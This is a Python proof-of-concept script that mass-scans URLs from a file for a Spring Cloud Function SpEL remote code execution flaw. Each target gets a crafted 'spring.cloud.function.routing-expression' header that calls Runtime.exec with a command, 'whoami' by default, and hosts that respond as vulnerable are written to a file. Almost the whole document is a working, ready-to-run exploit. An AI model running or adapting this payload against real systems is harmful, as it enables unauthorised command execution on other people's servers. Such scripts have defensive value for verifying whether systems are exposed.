import requests
import sys
import threading
import urllib3
urllib3.disable_warnings()

a='''
  $$$          $$$$$  $$       $$$$$    $$$   $$$$$     $$$$$    $$$$$    $$$    
 $$  $         $$     $$       $$  $$  $$  $  $$        $$  $$  $$   $$  $$  $   
 $$    $$$$$   $$     $$       $$  $$  $$     $$        $$  $$  $$   $$  $$      
  $$$  $$  $$  $$$$$  $$       $$$$$   $$     $$$$$     $$  $$  $$   $$  $$      
    $$ $$  $$  $$     $$       $$ $$   $$     $$        $$$$$   $$   $$  $$      
 $  $$ $$  $$  $$     $$       $$  $$  $$  $  $$        $$      $$   $$  $$  $   
  $$$  $$$$$   $$$$$  $$$$$    $$   $$  $$$   $$$$$     $$       $$$$$    $$$    
       $$                                                                        
       $$                                                                        
                                         by 欢迎关注chaosec 禁止一切违法！！！
'''

print(a)
print(' ')

def scan(txt,cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    f = open(txt)
    urllist=f.readlines()
    # print(all)
    for url in urllist:
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
            code =req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                print(f'[+]{url} There are loopholes - VULNERABLE!')
                poc_file = open('succ.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print(f'[-]{url} There are no loopholes - NOT-VULNERABLE')

        except requests.exceptions.RequestException:
            print(f'[-]{url} detection timeout')
            continue
        except:
            print(f'[-]{url} Anomalies detected')
            continue



if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        t=threading.Thread(target=scan(cmd1,'whoami') )#Batch detection using whoami by default
        t.start()
    except:
        print('Usage：')
        print('python Spel_RCE_POC.py urls.txt')
        pass
